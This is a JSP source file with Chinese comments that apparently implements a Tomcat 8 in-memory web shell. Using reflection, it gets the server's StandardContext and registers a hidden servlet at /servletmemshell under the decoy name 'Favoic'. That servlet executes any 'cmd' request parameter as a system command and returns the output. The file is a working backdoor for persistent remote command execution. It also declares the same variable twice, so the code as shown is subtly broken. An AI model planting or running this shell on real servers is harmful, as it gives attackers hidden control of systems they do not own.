<%--  Tomcat8 动态注册Servlet，这里是注册的httpservlet，在其dopost或者doget里面实现内存马都可以
--%>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.Container" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    //1、获取context对象
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();

    System.out.println(standardContext);

    ServletContext servletContext = request.getServletContext();//获取到applicationcontextFacade
    Field fieldApplicationContext = servletContext.getClass().getDeclaredField("context");//利用反射获取ApplicationContext对象
    fieldApplicationContext.setAccessible(true);//使私有可获取
    ApplicationContext applicationContext = (ApplicationContext) fieldApplicationContext.get(servletContext);//获取到ApplicationContext对象

    Field fieldStandardContext = applicationContext.getClass().getDeclaredField("context");//利用反射获取StandardContext对象
    fieldStandardContext.setAccessible(true);//使私有可获取
    StandardContext standardContext = (StandardContext) fieldStandardContext.get(applicationContext);//获取到StandardContext对象

    //2、注册添加servlet
    String shellServlet ="Favoic";
    if(servletContext.getServletRegistration(shellServlet)!=null) {
        shellServlet = "ga0weI";
    }
    HttpServlet httpServlet = new HttpServlet() {
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doGet(req,resp);
        }
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            Process ps = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(ps.getInputStream()));
//                BufferedInputStream bufferedInputStream = new BufferedInputStream(ps.getInputStream());
            StringBuilder result=new StringBuilder("");
            String s;
            while ((s=bufferedReader.readLine())!=null){
                result.append(s+"\n");
            }
            resp.getWriter().write(result.toString());
//                resp.getWriter().write("inject");
        }


    };

    //将注册的servlet对象封装到wrapper里面
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(shellServlet);
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(httpServlet);
    wrapper.setServletClass(httpServlet.getClass().getName());

    standardContext.addChild(wrapper);
    //映射
    standardContext.addServletMapping("/servletmemshell",shellServlet);
    response.getWriter().write("inject success");



%>